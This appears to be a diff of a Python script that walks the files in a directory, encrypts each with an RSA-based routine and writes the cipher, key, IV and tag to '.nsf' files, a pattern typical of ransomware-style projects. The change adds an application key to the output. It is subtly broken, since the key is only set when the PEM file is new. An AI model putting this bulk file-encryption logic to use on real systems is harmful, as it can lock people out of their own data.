@@ -8,7 +8,7 @@ if __name__ == '__main__':
     #Check if the PEM file currently exists 
     if os.path.isfile("./" + Constants.PEM_FILE) == False:
         #The file does not exist, make PEM file here
-        keygen.generate_PEM()
+        appKey = keygen.generate_PEM()
     #Retrieves the path to the current location of this file
     curr_path = os.getcwd()
     #Force python to skip the python cache folder
@@ -33,9 +33,10 @@ if __name__ == '__main__':
             print(file_path)
             encoded_cipher, encoded_IV, encoded_key, ext, file, encoded_tag = enc.MyRSAEncrypt(file_path)
             #Stringify the following list
-            cipher, IV, key, tag = enc.stringify([encoded_cipher, encoded_IV, encoded_key, encoded_tag])
+            encoded_appKey = enc.encode_text(appKey)
+            cipher, IV, key, tag, appKey = enc.stringify([encoded_cipher, encoded_IV, encoded_key, encoded_tag, encoded_appKey])
             #Generate map
-            item_map = {'c' : cipher, 'IV' : IV, 'key' : key, 'ext' : ext, 'tag' : tag}
+            item_map = {'c' : cipher, 'IV' : IV, 'key' : key, 'ext' : ext, 'tag' : tag, 'AppKey' : appKey}
             #Generate Json
             dump = json.dumps(item_map)
             f = open(file+ ".nsf", "w+")
